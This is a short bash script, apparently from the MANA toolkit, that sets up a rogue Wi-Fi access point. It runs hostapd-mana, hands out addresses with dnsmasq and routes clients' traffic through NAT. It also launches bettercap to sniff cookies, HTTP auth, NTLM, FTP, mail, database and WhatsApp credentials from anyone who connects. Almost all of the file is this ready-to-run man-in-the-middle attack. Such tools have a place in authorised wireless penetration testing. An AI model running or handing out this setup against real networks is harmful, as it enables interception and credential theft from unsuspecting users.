#!/bin/bash

upstream=eth0
phy=wlan1
conf=/etc/mana-toolkit/hostapd-mana.conf
hostapd=/usr/lib/mana-toolkit/hostapd

#Starts Bettercap sniffer only; NOTE: HTTPS traffic will not decrypted; use simple-nat-full.sh instead.
gnome-terminal -e "bettercap -I $phy --sniffer --no-discovery -L -S NONE -P COOKIE,DHCP,DICT,FTP,HTTPAUTH,HTTPS,IRC,MAIL,MPD,MYSQL,NNTP,NTLMSS,PGSQL,POST,REDIS,RLOGIN,SNMP,SNPP,URL,WHATSAPP"

service network-manager stop
rfkill unblock wlan

ifconfig $phy up

sed -i "s/^interface=.*$/interface=$phy/" $conf
$hostapd $conf&
sleep 5
ifconfig $phy 10.0.0.1 netmask 255.255.255.0
route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1

dnsmasq -z -C /etc/mana-toolkit/dnsmasq-dhcpd.conf -i $phy -I lo -P 0

echo '1' > /proc/sys/net/ipv4/ip_forward
iptables --policy INPUT ACCEPT
iptables --policy FORWARD ACCEPT
iptables --policy OUTPUT ACCEPT
iptables -F
iptables -t nat -F
iptables -t nat -A POSTROUTING -o $upstream -j MASQUERADE
iptables -A FORWARD -i $phy -o $upstream -j ACCEPT

echo "Hit enter to kill me"
read
pkill dnsmasq
pkill sslstrip
pkill sslsplit
pkill hostapd
pkill python
iptables -t nat -F
